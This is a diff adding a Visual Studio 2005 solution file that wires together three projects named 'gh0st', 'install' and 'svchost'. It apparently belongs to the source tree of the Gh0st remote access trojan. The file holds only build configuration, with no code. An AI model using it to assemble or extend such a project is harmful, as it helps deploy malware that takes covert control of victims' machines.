@@ -1,0 +1,32 @@
+﻿
+Microsoft Visual Studio Solution File, Format Version 9.00
+# Visual Studio 2005
+Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "gh0st", "gh0st\gh0st.vcproj", "{91377F59-E102-4DD6-ABAE-36B0BF1A5677}"
+EndProject
+Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "install", "Server\install\install.vcproj", "{EEB49B5E-377D-4A4E-AF3D-DB9A8612A346}"
+EndProject
+Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "svchost", "Server\svchost\svchost.vcproj", "{8D595834-EB7A-4E05-9D79-D323C56A3879}"
+EndProject
+Global
+	GlobalSection(SolutionConfigurationPlatforms) = preSolution
+		Console|Win32 = Console|Win32
+		Release|Win32 = Release|Win32
+	EndGlobalSection
+	GlobalSection(ProjectConfigurationPlatforms) = postSolution
+		{91377F59-E102-4DD6-ABAE-36B0BF1A5677}.Console|Win32.ActiveCfg = Release|Win32
+		{91377F59-E102-4DD6-ABAE-36B0BF1A5677}.Console|Win32.Build.0 = Release|Win32
+		{91377F59-E102-4DD6-ABAE-36B0BF1A5677}.Release|Win32.ActiveCfg = Release|Win32
+		{91377F59-E102-4DD6-ABAE-36B0BF1A5677}.Release|Win32.Build.0 = Release|Win32
+		{EEB49B5E-377D-4A4E-AF3D-DB9A8612A346}.Console|Win32.ActiveCfg = Release|Win32
+		{EEB49B5E-377D-4A4E-AF3D-DB9A8612A346}.Console|Win32.Build.0 = Release|Win32
+		{EEB49B5E-377D-4A4E-AF3D-DB9A8612A346}.Release|Win32.ActiveCfg = Release|Win32
+		{EEB49B5E-377D-4A4E-AF3D-DB9A8612A346}.Release|Win32.Build.0 = Release|Win32
+		{8D595834-EB7A-4E05-9D79-D323C56A3879}.Console|Win32.ActiveCfg = Console|Win32
+		{8D595834-EB7A-4E05-9D79-D323C56A3879}.Console|Win32.Build.0 = Console|Win32
+		{8D595834-EB7A-4E05-9D79-D323C56A3879}.Release|Win32.ActiveCfg = Release|Win32
+		{8D595834-EB7A-4E05-9D79-D323C56A3879}.Release|Win32.Build.0 = Release|Win32
+	EndGlobalSection
+	GlobalSection(SolutionProperties) = preSolution
+		HideSolutionNode = FALSE
+	EndGlobalSection
+EndGlobal
